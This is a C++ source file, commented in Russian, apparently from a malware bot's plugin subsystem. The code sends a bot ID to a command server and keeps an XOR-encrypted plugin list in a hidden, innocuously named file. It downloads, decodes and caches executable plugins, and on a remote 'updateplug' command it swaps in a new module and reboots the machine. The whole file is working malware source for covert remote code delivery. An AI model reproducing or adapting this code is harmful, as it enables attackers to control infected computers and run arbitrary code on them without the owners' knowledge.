//---------------------------------------------------------------------------

#include <shlobj.h>

#include "BotCore.h"
#include "BotHTTP.h"
#include "Plugins.h"
#include "HTTPConsts.h"
#include "Task.h"
#include "md5.h"

//---------------------------------------------------------------------------


// Создаём средства для вывода отладочной инфлормации

#include "BotDebug.h"

namespace PLGDEBUGTEMPLATES
{
    #include "DbgTemplates.h"
}
#define PDBG  PLGDEBUGTEMPLATES::DBGOutMessage<>


//---------------------------------------------------------------------------

// Методы для загрузки и хранения кэша плагинов
namespace PLGLoader
{

	// Пароль шифрования файла. Шифрование используется простейшее и
	// преследует цель скрыть содержимое файла от простого обывателя
    const static char PluginListPassword[] = {'G', 'D', 'l', 'e', 't', '6', '4', 'E',  0};

    // Сигнатура файла спичка
	#define PLUGINS_LIST_FILE_SIGNATURE 0xF3C5A945

	// Версия файла списка плагинов
	#define PLUGINS_LIST_FILE_VERSION 1

	//-------------------------------------------------------------------------

	// Заголовок файла плагинов
	#pragma pack(push, 1)
	typedef struct TFileHeader
	{
		DWORD Signature;   // Сигнатура файда
		DWORD Version;     // Версия файла
		DWORD UpdateTime;  // Время последнего обновления (в тиках)
        DWORD HostHash;    // Хэш хоста для которого обновляли список
        DWORD DataSize;    // Размер данных
	} *PFileHeader;
	#pragma pack(pop)

	//-------------------------------------------------------------------------

	PCHAR GetFileName()
	{
		// Функция возвращает имя файла списка плагинов
		const static char PluginsListFileName[] = {'w', 'n', 'd', 's', 'k', 's', 'i', '.', 'i', 'n', 'f',  0};

		return BOT::GetWorkPathInSysDrive(NULL, (PCHAR)PluginsListFileName);
	}

	//-------------------------------------------------------------------------
	bool NeedUpdateFile(PCHAR FileName, PCHAR Host)
	{
		// Функция вернёт истину если необходимо перегрузить
		// список плагинов

		// Открываем файл для чтения
		HANDLE File = pCreateFileA(FileName, GENERIC_READ, FILE_SHARE_READ, 0,
							OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

		if (File == INVALID_HANDLE_VALUE)
		{
			//  Возвращаем истину если файл не найден
			return (DWORD)pGetLastError() == ERROR_FILE_NOT_FOUND;
		}

		// Читаем заголовок файла
		TFileHeader H;
		ClearStruct(H);

		DWORD Readed;
		pReadFile(File, &H, sizeof(H), &Readed, NULL);
		if (Readed != sizeof(H))
		{
			// Ошибочный файл
			pCloseHandle(File);
            return true;
		}


		// Проверяем с этого-ли хоста была предыдущая загрузка
		bool Result = H.HostHash != CalcHash(Host);

		pCloseHandle(File);
		return Result;

    }
	//-------------------------------------------------------------------------

	void DoWriteBufferToFile(HANDLE File, PCHAR Buf, PCHAR Host)
	{
		// Функция записывает загруженный буфер в файл

		DWORD Writed;

		// Записываем заголовок файла

		TFileHeader H;

		H.Signature  = PLUGINS_LIST_FILE_SIGNATURE;
		H.Version    = PLUGINS_LIST_FILE_VERSION;
		H.UpdateTime = (DWORD)pGetTickCount();
		H.HostHash   = CalcHash(Host);
		H.DataSize   = STR::Length(Buf);

		pWriteFile(File, &H, sizeof(H), &Writed, NULL);

		if (H.DataSize == 0)
			return;

		// Шифруем буфер
        XORCrypt::Crypt((PCHAR)PluginListPassword, (LPBYTE)Buf, H.DataSize);

        // Записываем в файл
		pWriteFile(File, Buf, H.DataSize, &Writed, NULL);
	}
    //-------------------------------------------------------------------------

	bool DownloadListInFile(PCHAR FileName, PCHAR URL, PCHAR Host)
	{
		// Функция загружает список плагинов в файл
		// на время загрузки файл блокируется

		// Создаём файл для записи
		HANDLE File = (HANDLE)pCreateFileA(FileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,  FILE_ATTRIBUTE_HIDDEN, NULL);

		if (File == INVALID_HANDLE_VALUE)
		{
			// В случае ошибки открытия файла для записи истину возвращаем
			// Иистину только в случае ошибки общего доступа, что означает
			// занятость файла другим процессом/потоком для загрузки списка
			return pGetLastError() == ERROR_SHARING_VIOLATION;
		}


		// Запускаем цик загрузки списка плагинов
        PDBG("Plugins", "Загружаем список плагинов");
		PCHAR Buf = NULL;
		do
		{
			PDBG("Plugins", "try to DownloadPluginList('%s')", URL);
			Buf = Plugin::DownloadPluginList(URL);
			if (Buf != NULL)
			{
				// Записываем буффер в файл
				PDBG("Plugins", "Список плагинов загружен");
                DoWriteBufferToFile(File, Buf, Host);
			}
			else
			{
				PDBG("Plugins", "DownloadPluginList failed. Sleeping 30 sec...");
				pSleep(30 * 1000);
			}
		}
		while (Buf == NULL);
				
		// Закрываем файл
		pCloseHandle(File);

		return true;
	}
    //-------------------------------------------------------------------------

	PCHAR ReadListFromFile(PCHAR FileName)
	{
		// Функция загружает список плагинов из файла

		DWORD Size = 0;
		LPBYTE Buf = File::ReadToBufferA(FileName, Size);
		if (Buf == NULL)
			return NULL;
		if (Size < sizeof(TFileHeader))
		{
			MemFree(Buf);
			return NULL;
        }

		// Получаем заголовок
		PFileHeader H = (PFileHeader)Buf;

		if (H->DataSize > (Size - sizeof(TFileHeader)))
		{
			// Файл либо битый, либо не наш
			MemFree(Buf);
            pDeleteFileA(FileName);
			return NULL;
        }

		// Шифруем буфер
		LPBYTE Temp = Buf + sizeof(TFileHeader);
        XORCrypt::Crypt((PCHAR)PluginListPassword, Temp, H->DataSize);

		PCHAR Str = STR::New((PCHAR)Temp, H->DataSize);
		MemFree(Buf);

		return Str;

	}
	//------------------------------------------------------------------------

	PCHAR ExtractPluginURL(PCHAR PluginName, PCHAR Buf)
	{
		// Функция извлекает адрес плагина на сервере
		if (Buf == NULL)
			return NULL;

		// Определяем позицию имени в буфере
		int Pos = STR::Pos(Buf, PluginName, 0);
		if (Pos < 0)
			return NULL; // В списке нет нужного плагина

		// Пропускаем разделитель |
		PCHAR Start = Buf + Pos;
		PCHAR End = Start;
		while (*End != '|') End++;
		End++;

        Start = End;

		// Определяем Конец строки
		while (*End != 0 && *End != 10 && *End != 13) End++;

		// Возвращаем адрес
		return STR::New(Start, End - Start);

	}
}


//****************************************************************************
//	Методя для работ с кэшем плагинов
//****************************************************************************
namespace PLGCACHE
{

	char CacheFolder[] = {'p', 'g', 'c', 'h', 'e', '\\', 0};

	//=========================================================================

	PCHAR inline GetCachePath()
	{
		// Функция возвращает путь к хранилищу кеша
		return BOT::GetWorkPathInSysDrive(CacheFolder, NULL);
	}
	//-------------------------------------------------------------------------

	PCHAR GetPluginCacheFileName(PCHAR Path, PCHAR PluginName)
	{
		// Функция возвращает имя файла плагина
		if (STR::IsEmpty(PluginName))
        	return NULL;


		// Получаем путь к хранилищу
		bool FreePath = STR::IsEmpty(Path);
		if (FreePath)
			Path = GetCachePath();
		if (Path == NULL)
			return NULL;


		// Получаем полное имя файла
		PCHAR FN = STR::New(2, Path, PluginName);


        // Освобождаем данне
		if (FreePath)
            STR::Free(Path);

		return FN;
	}
	//-------------------------------------------------------------------------

}

//****************************************************************************
//  Методы работы с плагинами
//****************************************************************************

PCHAR Plugin::GetURL(PCHAR Name, PCHAR PluginsListURL, bool UpdateList)
{
	// Функция возвращает адрес по которому можно загрузить плагин
	if (STR::IsEmpty(Name))
		return NULL;

	PDBG("Plugins", "Получаем адрес плагина [%s]", Name);

	// Получаем адрес загрузки
	bool FreeURL = false;
	if (STR::IsEmpty(PluginsListURL))
	{
		FreeURL = true;
		PluginsListURL = GetBotScriptURL(SCRIPT_PLUGINS_LIST);
	}
	if (PluginsListURL != NULL)
	{
    	PDBG("Plugins", "Адрес списка плагинов: \r\n   [%s]", PluginsListURL);
	}
	else
	{
		PDBG("Plugins", "Не удалось получить адрес списка плагинов!");
		return NULL;
    }

	// Распарсиваем адрес списка плагинов для получения хоста
	TURLREC URLRec;
	ClearStruct(URLRec);

	ParseURL(PluginsListURL, &URLRec);

	// Получаем имя файла в котором хранится список плагинов
    PCHAR FileName = PLGLoader::GetFileName();
	PDBG("Plugins", "Имя файла со списком плагинов [%s]", FileName);

	// Этап первый. Загружаем список плагинов
	// Загружаем в случае если UpdateList == true либо трубуемый файл
	// отсутствует на диске
	// На случай ошибок файловой системы зацикливаем загрузку
	if (UpdateList || PLGLoader::NeedUpdateFile(FileName, URLRec.Host))
	{
		bool Completed = false;
		do
		{
			PDBG("Plugins", "Выставлено грузить список из сети. Пробуем грузить");
			if (PluginsListURL != NULL)
				Completed = PLGLoader::DownloadListInFile(FileName, PluginsListURL, URLRec.Host);

			if (!Completed)
			{
				pSleep(3000);
				if (FreeURL)
				{
					ClearURL(&URLRec);
					STR::Free(PluginsListURL);
					PluginsListURL = GetBotScriptURL(SCRIPT_PLUGINS_LIST);
                    ParseURL(PluginsListURL, &URLRec);
                }
			}

		}
		while (!Completed);
	}
	else 
	{
		PDBG("Plugins", "Грузить из сети не надо. Загружаем из файла кеша.");
	}

	// Этап второй: Пытаемся прочитать файл
	// Чтение из файла так-же зацикливаем. Делаем по причине того, что
	// в данный момент может идти загрузка списка и функция вернёт NULL
	PCHAR Buf = NULL;
	do
	{
		Buf = PLGLoader::ReadListFromFile(FileName);
		if (Buf == NULL)
			pSleep(60000);
	}
	while (Buf == NULL);

	//Этап третий: Собираем ссылку
	PCHAR FullURL = NULL;
	//File::WriteBufferA( "c:\\plg.txt", Buf, STR::Length(Buf) );
	PCHAR URLFileName = PLGLoader::ExtractPluginURL(Name, Buf);
	if (URLFileName != NULL)
	{
		PDBG("Plugins", "Путь к плагину: [%s]", URLFileName);
		FullURL = STR::New(5, ProtocolHTTP, HTTPProtocolDelimeter, URLRec.Host, "/", URLFileName );
		STR::Free(URLFileName);
	}

	STR::Free(FileName);
	STR::Free(Buf);
	if (FreeURL) STR::Free(PluginsListURL);
	ClearURL(&URLRec);

	
	PDBG("Plugins", "Адрес плагина: [0x%X : '%s']", FullURL, 
		((FullURL == NULL) ? "(null)":FullURL));

	return FullURL;
}
//---------------------------------------------------------------------------


PCHAR Plugin::DownloadPluginList(PCHAR URL)
{
	// Загружаем список плагинов доступных на текущем сервере

	bool FreeURL = false;
	if (URL == NULL)
	{
		FreeURL = true;
		URL = GetBotScriptURL(SCRIPT_PLUGINS_LIST);
	}
	if (URL == NULL) return NULL;

    // Отправляем ПОСТ запрос
	PCHAR Result = NULL;
	PCHAR BotID = GenerateBotID();

	PStrings Fields = Strings::Create();
	AddURLParam(Fields, "botuid", BotID);

	THTTPResponse Response;
    ClearStruct(Response);

	#ifdef CryptHTTPH
		PCHAR Password = GetMainPassword();
		CryptHTTP::Post(URL, Password, Fields, &Result, &Response);
		STR::Free(Password);
	#else
		HTTP::Post(URL, Fields, &Result, NULL);
	#endif

    // Орбатываем результат ответа сервера
	if (FreeURL) STR::Free(URL);
	STR::Free(BotID);
	Strings::Free(Fields);

	if (Response.Code != 200)
		STR::Free2(Result);

    HTTPResponse::Clear(&Response);


    PDBG("Plugins", "Содержимое загруженного списка плагинов: \r\n: [%s]", Result);

	return Result;
}
//---------------------------------------------------------------------------

LPBYTE Plugin::DownloadFile(PCHAR PluginName, PCHAR PluginsListURL, DWORD *FileSize)
{

	//  Функция загружает файл плагина с сервера. Файл остаётся
	//	в неизменном состоянии, т.е. не расшифровывается.

	if (FileSize != NULL)
		*FileSize = 0;
	PDBG("Plugins", "Загружаем файл плагина [%s]", PluginName);

	// Запускаем цикл загрузки плагина
	bool UpdateList = false;
	DWORD UpdateCount = 0; // Счётчик обновлений списка

    LPBYTE Module = NULL;
	do
	{
		// Получаем полный адрес плагина

		PCHAR URL = GetURL(PluginName, PluginsListURL, UpdateList);

		if (URL == NULL)
		{
			// На сервере отсутствует запрашиваемый плагин
			PDBG("Plugins", "GetURL('%s', '%s', %d) вернул NULL. Спим 30 сек и пробуем еще.", 
				PluginName, PluginsListURL, UpdateList);
			pSleep(30 * 1000);
			UpdateList = true;
			continue;
		}

		// В случае не первого обновления списка, перед очередной попыткой
		// скачать файд, приостанавливаем поток
		if (UpdateList && UpdateCount > 1)
		{
			DWORD Interval = 60000;

			if (UpdateCount > 10)
			{
				if (UpdateCount <= 20)
					Interval = Interval * 2;
				else
				if (UpdateCount <= 100)
					Interval = Interval * 3;
				else
					Interval = Interval * 5;
			}

			pSleep(Interval);
		}

		// Загружаем документ

		THTTPResponse Response;
		ClearStruct(Response);

		PCHAR Document = NULL;
		#ifdef CryptHTTPH
			PCHAR Pass = GetMainPassword();

			bool Loaded = CryptHTTP::Get(URL, Pass, &Document, &Response);
			STR::Free(Pass);
		#else
			bool Loaded = HTTP::Get(URL, &Document, &Response);
		#endif

		STR::Free(URL);

		// Обрабатываем результат загрузки
		UpdateList = false;

		if (Loaded)
		{
			if (Response.Code == HTTP_CODE_OK)
			{
				PDBG("Plugins", "Плагин [%s] успешно загружен", PluginName);
				// Копируем файл
				DWORD Size = STR::Length(Document);
				Module = (LPBYTE)MemAlloc(Size);
				if (Module == NULL) break;

				// Копируем документ
                m_memcpy(Module, Document, Size);
				if (FileSize != NULL)
					*FileSize = Size;
			}
			else
			{
				UpdateList = true;
				UpdateCount++;
			}
		}
		else
		{
			// В случае отсутствия интернета засыпаем на некоторое время
			pSleep(60000);
        }

		HTTPResponse::Clear(&Response);
	}
	while (Module == NULL);

    return Module;
}
//---------------------------------------------------------------------------

LPBYTE Plugin::Decode(LPBYTE Buffer, DWORD BufferSize, bool IsExecutable, DWORD *NewBufferSize)
{
	// Функция декодирует плагин.
	if (NewBufferSize != NULL)
		*NewBufferSize = 0;

	if (Buffer == NULL || BufferSize == 0)
		return NULL;

	// Расшифровываем XOR алгоритмом
	const static char Signature[] = {'B', 'J', 'B', 0};
	DWORD Size = BufferSize;
	LPBYTE Body = XORCrypt::DecodeBuffer((PCHAR)Signature, Buffer, Size);

	if (Body == NULL)
	{
		// Нулевой указатель означает, что модуль не был зашифрован
		// XOR криптованием
		Body = Buffer;
		Size = BufferSize;
	}

	// Создаём чистый модуль
	LPBYTE Module = NULL;
	if (Body != NULL && Size > 0 && (!IsExecutable || IsExecutableFile(Body)))
	{
		Module = (LPBYTE)MemAlloc(Size);
 		if (Module != NULL)
		{
			m_memcpy(Module, Body, Size);
			if (NewBufferSize != NULL)
				*NewBufferSize = Size;
		}
	}

	return Module;
}

//---------------------------------------------------------------------------

LPBYTE Plugin::Download(PCHAR PluginName, PCHAR PluginListURL, DWORD *Size, bool IsExecutable)
{
	// Функция загружает и дектодирует плагин
	return DownloadEx(PluginName, PluginListURL, Size, IsExecutable, false, NULL);
}
//---------------------------------------------------------------------------

LPBYTE Plugin::DownloadEx(PCHAR PluginName, PCHAR PluginListURL, DWORD *Size,
				  bool IsExecutable, bool UseCache, PCHAR CachePath)
{
	// Функция загружает и декодирует плагин используя
	// дополнительные настройки
	if (Size != NULL)
		*Size = 0;

    // Получаем имя файла кэша
	PCHAR CacheFileName = NULL;
	if (UseCache)
		CacheFileName = PLGCACHE::GetPluginCacheFileName(CachePath, PluginName);

	PDBG("Plugins", "DownloadEx: GetPluginCacheFileName() CacheFileName='%s'", CacheFileName);

	DWORD BufSize = 0;
	LPBYTE Buffer = NULL;

	// Проверяем наличие файла в кэше и флаг использования кеша
	if (CacheFileName != NULL)
	{
		PDBG("Plugins", "DownloadEx: try ReadToBuffer() CacheFileName='%s'", CacheFileName);
		
		Buffer = (LPBYTE)CryptFile::ReadToBuffer(CacheFileName, &BufSize, NULL);
		
		PDBG("Plugins", "DownloadEx: ReadToBuffer() Buffer=0x%X", Buffer);
	}

	// загружаем файл плагина из сети, если:
	// 1) выставлен флаг использования кеша и не удалось прочитать файл
	// 2) не выставлен флаг использования кеша
	bool Downloaded = false;
	if (Buffer == NULL)
	{
		PDBG("Plugins", "DownloadEx: try DownloadFile() CacheFileName='%s'", CacheFileName);

		Buffer = DownloadFile(PluginName, PluginListURL, &BufSize);
		Downloaded = true;
	
		PDBG("Plugins", "DownloadEx: DownloadFile() result 0x%X", Buffer);
    }

	if (Buffer == NULL)
		return NULL;


	// 2. Расшифровываем плагин
	// Важный момент: файл НЕ БУДЕТ раскодироватся только в случае, если 
	// выставлен флаг "IsExecutable" и присланный файл действительно имеет PE 
	// сигнатуру

	LPBYTE Module = NULL;

	if (!IsExecutable || !IsExecutableFile(Buffer))
	{
		Module = Decode(Buffer, BufSize, IsExecutable, &BufSize);
		PDBG("Plugins", "DownloadEx: loaded buffer decoded.");
	}
	else
	{
		PDBG("Plugins", "DownloadEx: loaded buffer NOT decoding.");
		Module = Buffer;
	}

	// При необходимости кэшируем файл:
	// когда выставлен флаг использования кеша и файл был скачан из сети
	if (CacheFileName != NULL && Downloaded && Module != NULL)
	{
		PDBG("Plugins", "DownloadEx: writing file to CacheFileName='%s'", CacheFileName);
		CryptFile::WriteFromBuffer(CacheFileName, Module, BufSize, NULL);
	}

	// Освобождаем данные
	if (Module != Buffer) MemFree(Buffer);
	STR::Free(CacheFileName);


    // Возвращаем результат
	if (Size != NULL)
		*Size = BufSize;
	return Module;
}
//---------------------------------------------------------------------------

bool Plugin::DownloadInCache(PCHAR PluginName, bool IsExecutable, bool IgnoreIfExists, PCHAR CachePath)
{
	//  функция загружает плагин в кэш

	// Проверяем существует ли файл на диске
	if (IgnoreIfExists)
	{
		PCHAR FN = PLGCACHE::GetPluginCacheFileName(CachePath, PluginName);
		bool Exists = FileExistsA(FN);
		STR::Free(FN);

		if (Exists)
        	return true;
    }

    // Загружаем файл
	LPBYTE Buf = DownloadEx(PluginName, NULL, NULL, IsExecutable, true, CachePath);

	bool Result = Buf != NULL;

	MemFree(Buf);

	return Result;
}
//---------------------------------------------------------------------------


LPBYTE Plugin::DownloadFromCache(PCHAR PluginName, bool IsExecutable,  PCHAR CachePath, DWORD *PluginSize)
{
	// функция загружает плагин из кэша
	if (PluginSize != NULL)
        *PluginSize = 0;

	PCHAR FN = PLGCACHE::GetPluginCacheFileName(CachePath, PluginName);

	if (FN == NULL)
		return NULL;

	DWORD Size = 0;
	LPBYTE Buf = (LPBYTE)CryptFile::ReadToBuffer(FN, &Size, NULL);


	if (Buf != NULL && IsExecutable  && !IsExecutableFile(Buf))
	{
		MemFree(Buf);
		Buf = NULL;
		Size = 0;
    }

	STR::Free(FN);

	if (PluginSize != NULL)
		*PluginSize = Size;
    return Buf;
}
//---------------------------------------------------------------------------
const char* Plugin::CommandUpdatePlug = "updateplug";

void CalcMd5SummForBuffer(const void* data, DWORD size, BYTE summ[16])
{
	MD5_CTX ctx;	

	MD5Init(&ctx);
	MD5Update( &ctx, (unsigned char*)data, size );

	MD5Final(summ, &ctx);
}

bool Plugin::ExecuteUpdatePlug(PTaskManager Manager, PCHAR Command, PCHAR Args)
{
	PDBG("Plugins", "ExecuteUpdatePlug: '%s'", Args);
	
	PCHAR  PlugName = Args;

	DWORD  CachedFileSize = 0;
	LPBYTE CachedFile = DownloadFromCache(PlugName, true, NULL, &CachedFileSize);
	PDBG("Plugins", "ExecuteUpdatePlug: DownloadFromCache() return body=0x%X size=%d", CachedFile, 
		CachedFileSize);

	DWORD  NetworkFileSize = 0;
	LPBYTE NetworkFile = DownloadEx(PlugName, NULL, &NetworkFileSize, true, false, NULL);
	PDBG("Plugins", "ExecuteUpdatePlug: Download() return body=0x%X size=%d", NetworkFile, 
		NetworkFileSize);

	PCHAR CacheFileName = PLGCACHE::GetPluginCacheFileName(NULL, PlugName);

	do
	{
		PDBG("Plugins", "ExecuteUpdatePlug: check is file loaded from network");
		// Проверяем загрузился ли плаг
		if (NetworkFile == NULL) break;

		// Проверяем формат (PE)
		PDBG("Plugins", "ExecuteUpdatePlug: check file from network for PE");
		if (!IsExecutableFile(NetworkFile)) break;

		// Сверяем md5 суммы
		PDBG("Plugins", "ExecuteUpdatePlug: compare md5 summs");
		if (CachedFile != NULL)
		{
			BYTE sumCached[16];
			BYTE sumNetwork[16];

			m_memset(sumCached, 0, 16);
			m_memset(sumNetwork, 0, 16);

			CalcMd5SummForBuffer(CachedFile, CachedFileSize, sumCached);
			CalcMd5SummForBuffer(NetworkFile, NetworkFileSize, sumNetwork);

			int sumCompareResult = m_memcmp(sumCached, sumNetwork, 16);
			PDBG("Plugins", "ExecuteUpdatePlug: sumCompareResult=%d", sumCompareResult);

			// Если сумма одинакова - ничего не делаем.
			if (sumCompareResult == 0) break;
		}
		
		// Проверяем получилось ли получить файла для кеша.
		if (CacheFileName == NULL) break;
		
		DWORD written = CryptFile::WriteFromBuffer(CacheFileName, NetworkFile, NetworkFileSize, NULL);
		PDBG("Plugins", "ExecuteUpdatePlug: CryptFile::WriteFromBuffer() return %d", written);

		// Не получилось записать.
		if (written == 0) break;

		PDBG("Plugins", "ExecuteUpdatePlug: start machine reboot.");
		Reboot();

		return true;
	}
	while (0);


	if (CachedFile) MemFree(CachedFile);
	if (NetworkFile) MemFree(NetworkFile);
	if (CacheFileName) STR::Free(CacheFileName);

	return false;
}
